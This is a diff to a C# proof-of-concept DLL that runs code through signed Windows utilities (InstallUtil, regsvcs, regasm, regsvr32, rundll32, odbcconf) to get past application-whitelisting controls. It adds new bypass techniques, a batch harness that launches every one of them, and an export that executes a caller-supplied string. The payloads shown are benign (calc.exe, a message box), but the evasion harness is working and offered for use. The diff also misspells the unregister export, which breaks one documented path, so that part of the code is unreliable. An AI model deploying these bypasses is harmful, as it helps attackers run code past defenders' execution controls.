@@ -4,10 +4,11 @@ using System.Reflection;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.EnterpriseServices;
+using RGiesecke.DllExport;
+using System.Windows.Forms;
+
 // You will need Visual Studio and UnmanagedExports to build this binary
 // Install-Package UnmanagedExports -Version 1.2.7
-using RGiesecke.DllExport;
-
 
 
 /*
@@ -20,28 +21,50 @@ Includes 5 Known Application Whitelisting/ Application Control Bypass Techinique
 1. InstallUtil.exe
 2. Regsvcs.exe
 3. Regasm.exe
-4. regsvr32.exe 
+4. regsvr32.exe
 5. rundll32.exe
-
+6. odbcconf.exe
+7. regsvr32 with params
 
 
 Usage:
-1. 
+1.
     x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
-    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
-2. 
+    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+2.
     x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
     x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
-3. 
+3.
     x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
     x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
 
-4. 
-    regsvr32 /s  /u AllTheThings.dll -->Calls DllUnregisterServer
+4.
+    regsvr32 /s /u AllTheThings.dll -->Calls DllUnregisterServer
     regsvr32 /s AllTheThings.dll --> Calls DllRegisterServer
-5. 
+5.
     rundll32 AllTheThings.dll,EntryPoint
-    
+
+6.
+    odbcconf.exe /s /a { REGSVR AllTheThings.dll }
+
+7.
+    regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
+
+
+Sample Harness.Bat
+
+[Begin]
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
+regsvr32 /s /u AllTheThings.dll
+regsvr32 /s AllTheThings.dll
+rundll32 AllTheThings.dll,EntryPoint
+odbcconf.exe /a { REGSVR AllTheThings.dll }
+regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
+[End]
+
+
 */
 
 [assembly: ApplicationActivation(ActivationOption.Server)]
@@ -64,6 +87,11 @@ public class Thing0
         ProcessStartInfo startInfo = new ProcessStartInfo();
         startInfo.FileName = "calc.exe";
         Process.Start(startInfo);
+    }
+
+    public static void ExecParam(string a)
+    {
+        MessageBox.Show(a);
     }
 }
 
@@ -111,24 +139,34 @@ class Exports
 {
 
     //
-    // 
+    //
     //rundll32 entry point
-    [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
-    public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
-    {
-        Thing0.Exec();
-    }
-    [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
-    public static void DllRegisterServer()
-    {
-        Thing0.Exec();
-    }
-    [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
-    public static void DllUnregisterServer()
-    {
-        Thing0.Exec();
-    }
+        [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
+        public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
+        {
+            Thing0.Exec();
+        }
 
-   
+        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
+        public static bool DllRegisterServer()
+        {
+            Thing0.Exec();
+            return true;
+        }
+
+        [DllExport("DlluNRegisterServer", CallingConvention = CallingConvention.StdCall)]
+        public static bool DllUUnregisterServer()
+        {
+            Thing0.Exec();
+            return true;
+        }
+
+    [DllExport("DllInstall", CallingConvention = CallingConvention.StdCall)]
+        public static void DllInstall(bool bInstall, IntPtr a)
+        {
+            string b = Marshal.PtrToStringUni(a);
+            Thing0.ExecParam(b);
+        }
+
 
 }
